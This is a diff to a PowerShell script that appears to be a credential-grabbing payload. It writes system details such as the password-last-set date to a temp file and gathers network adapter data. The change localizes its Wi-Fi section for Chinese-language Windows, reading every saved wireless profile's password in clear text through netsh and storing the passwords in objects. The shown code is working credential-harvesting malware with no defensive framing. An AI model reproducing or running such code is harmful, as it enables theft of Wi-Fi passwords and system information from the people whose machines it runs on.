@@ -196,7 +196,7 @@ if ($pls) { echo "`nPassword Last Set: $pls" >> $Env:temp\foo.txt }
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
 
 # Get Wifi SSIDs and Passwords	
-$WLANProfileNames =@()
+$WLANProfileNames = netsh wlan show profiles | Select-String "所有用户配置文件 : " | ForEach-Object { $_.ToString().Split(':')[1].Trim() }
 
 #Get all the WLAN profile names
 $Output = netsh.exe wlan show profiles | Select-String -pattern " : "
@@ -211,19 +211,14 @@ $WLANProfileObjects =@()
 Foreach($WLANProfileName in $WLANProfileNames){
 
     #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
-    try{
-        $WLANProfilePassword = (netsh.exe wlan show profiles name="$WLANProfileName" key=clear | Select-String -Pattern "关键内容\s+:\s+\S+" | ForEach-Object { $_.ToString().Split(':')[1].Trim() })
-        if (-not $WLANProfilePassword) {
-            throw
-        }
-    } catch {
-        $WLANProfilePassword = "The password is not stored in this profile"
-    }
+    $details = netsh wlan show profile name="$WLANProfileName" key=clear
+    $wifiName = $details | Select-String "名称" | ForEach-Object { $_.ToString().Split(':')[1].Trim() }
+    $keyContent = $details | Select-String "关键内容" | ForEach-Object { $_.ToString().Split(':')[1].Trim() }
 
     #Build the object and add this to an array
     $WLANProfileObject = New-Object PSCustomobject 
-    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
-    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
+    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $wifiName
+    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $keyContent
     $WLANProfileObjects += $WLANProfileObject
     Remove-Variable WLANProfileObject
 }
